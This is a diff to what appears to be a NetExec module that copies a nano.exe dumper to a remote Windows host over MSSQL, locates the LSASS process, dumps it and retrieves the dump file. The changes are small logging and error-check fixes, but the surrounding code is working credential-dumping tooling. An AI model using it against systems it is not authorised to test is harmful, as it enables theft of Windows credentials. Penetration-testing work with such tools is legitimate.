@@ -39,7 +39,6 @@ class NXCModule:
         NANO_EXE_NAME       Name of the nano executable (default: nano.exe)
         DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = NANO_PATH)
         """
-        self.context = context
         self.remote_tmp_dir = "C:\\Windows\\Temp\\"
         self.share = "C$"
         self.tmp_share = self.remote_tmp_dir.split(":")[1]
@@ -98,7 +97,7 @@ class NXCModule:
             with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                 try:
                     self.context.log.display(f"Copy {self.nano} to {self.remote_tmp_dir}")
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.put_file(nano.read(), self.remote_tmp_dir + self.nano)
                     if exec_method.file_exists(self.remote_tmp_dir + self.nano):
                         self.context.log.success(f"Created file {self.nano} on the remote machine {self.remote_tmp_dir}")
@@ -118,12 +117,12 @@ class NXCModule:
         self.context.log.display(f"Getting LSASS PID via command {command}")
         p = self.connection.execute(command, display_output)
         self.context.log.debug(f"tasklist Command Result: {p}")
-        if len(p) == 1:
-            p = p[0]
-
         if not p or p == "None":
             self.context.log.fail("Failed to execute command to get LSASS PID")
             return
+
+        if len(p) == 1:
+            p = p[0]
 
         pid = p.split(",")[1][1:-1]
         self.context.log.debug(f"pid: {pid}")
@@ -174,7 +173,7 @@ class NXCModule:
                     self.context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
             else:
                 try:
-                    exec_method = MSSQLEXEC(self.connection.conn)
+                    exec_method = MSSQLEXEC(self.connection.conn, self.context.log)
                     exec_method.get_file(self.remote_tmp_dir + nano_log_name, filename)
                     self.context.log.success(f"Dumpfile of lsass.exe was transferred to {filename}")
                 except Exception as e:
